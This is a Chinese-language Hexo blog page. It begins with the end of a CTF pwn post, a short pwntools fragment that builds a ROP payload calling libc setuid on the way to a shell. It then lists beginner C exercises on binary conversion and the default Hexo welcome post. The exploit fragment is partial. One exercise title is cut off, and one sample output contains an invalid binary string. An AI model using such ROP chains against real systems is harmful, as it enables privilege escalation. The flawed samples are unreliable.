<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]    </span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line">payload=flat(pop_rdi_ret,<span class="number">0</span>,stuid,用于拿到shell的过程)    </span><br></pre></td></tr></table></figure>



<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/image-20240325200803566-17115472740935.png" alt="image-20240325200803566"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-C语言题目" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/" class="article-date">
  	<time datetime="2024-03-26T13:22:41.000Z" itemprop="datePublished">2024-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/">
        C语言题目
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ol>
<li><h4 id="编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"><a href="#编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。" class="headerlink" title="编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"></a>编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。</h4></li>
</ol>
<p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1: 1</span><br><span class="line">3: 11</span><br><span class="line">7: 111</span><br><span class="line">15: 1111</span><br><span class="line">31: 11111</span><br></pre></td></tr></table></figure>

<p>2定义一个名为 <code>IntegerInfo</code> 的结构体，它包含两个成员变量，一个整型变量 <code>num</code> 用于存储整数，另一个字符串 <code>binary</code> 用于存储整数的二进制表示。编写一个函数，接受一个整数作为参数，返回一个 <code>IntegerInfo</code> 结构体，其中的 <code>num</code> 存储输入整数，<code>binary</code> 存储整数的二进制表示。</p>
<p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">num: 5</span><br><span class="line">binary: 101</span><br></pre></td></tr></table></figure>

<h4 id="3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。"><a href="#3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。" class="headerlink" title="3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有大于 n 的元素的二进制表示。"></a>3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有大于 <code>n</code> 的元素的二进制表示。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1111</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>

<h4 id="4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。"><a href="#4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。" class="headerlink" title="4定义一个名为 BinaryString 的结构体，包含一个字符串 str 用于存储二进制数字，和一个整型变量 length 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。"></a>4定义一个名为 <code>BinaryString</code> 的结构体，包含一个字符串 <code>str</code> 用于存储二进制数字，和一个整型变量 <code>length</code> 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">H: 1001000</span><br><span class="line">e: 1100101</span><br><span class="line">l: 1101100</span><br><span class="line">l: 1101100</span><br><span class="line">o: 1101111</span><br></pre></td></tr></table></figure>

<h4 id="5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。"><a href="#5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。" class="headerlink" title="5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 n 的结构体的字符串的二进制表示。"></a>5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 <code>n</code> 的结构体的字符串的二进制表示。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 Hello</span><br><span class="line">15 World</span><br><span class="line">31 Test</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">World: 1010111 1101111 1140100 1100100 1100100</span><br><span class="line">Test: 1010100 1100101 1110011 1110100</span><br></pre></td></tr></table></figure>

<h4 id="6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"><a href="#6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。" class="headerlink" title="6编写一个 C 程序，定义一个名为 Array 的结构体，包含两个成员：一个整型指针 data 用于存储数组的元素，一个整型变量 length 用于存储数组的长度。使用动态内存分配创建一个 Array 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"></a>6编写一个 C 程序，定义一个名为 <code>Array</code> 的结构体，包含两个成员：一个整型指针 <code>data</code> 用于存储数组的元素，一个整型变量 <code>length</code> 用于存储数组的长度。使用动态内存分配创建一个 <code>Array</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 15 7 3 1</span><br></pre></td></tr></table></figure>

<h6 id="7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"><a href="#7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。" class="headerlink" title="7编写一个 C 程序，定义一个名为 Buffer 的结构体，包含两个成员：一个字符指针 data 用于存储字符串，一个整型变量 length 用于存储字符串的长度。使用动态内存分配创建一个 Buffer 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"></a>7编写一个 C 程序，定义一个名为 <code>Buffer</code> 的结构体，包含两个成员：一个字符指针 <code>data</code> 用于存储字符串，一个整型变量 <code>length</code> 用于存储字符串的长度。使用动态内存分配创建一个 <code>Buffer</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。</h6><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLO WORLD</span><br></pre></td></tr></table></figure>

<h4 id="8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"><a href="#8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。" class="headerlink" title="8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"></a>8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 3</span><br><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 9</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> title: xxx    <span class="comment">//在此处添加你的标题。 </span></span><br><span class="line"></span><br><span class="line">date: <span class="number">2016</span><span class="number">-10</span><span class="number">-07</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">49</span>   <span class="comment">//在此处输入编辑这篇文章的时间。 </span></span><br><span class="line"></span><br><span class="line">tags: xxx    <span class="comment">//在此处输入这篇文章的标签。 </span></span><br><span class="line"></span><br><span class="line">categories: xxx    <span class="comment">//在此处输入这篇文章的分类。 ---</span></span><br></pre></td></tr></table></figure>




      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E9%A2%98%E7%9B%AE/">题目</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/26/hello-world/" class="article-date">
  	<time datetime="2024-03-26T13:10:50.200Z" itemprop="datePublished">2024-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/26/hello-world/">
        Hello World
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#x6f;&#x6d;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 wgiegie
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>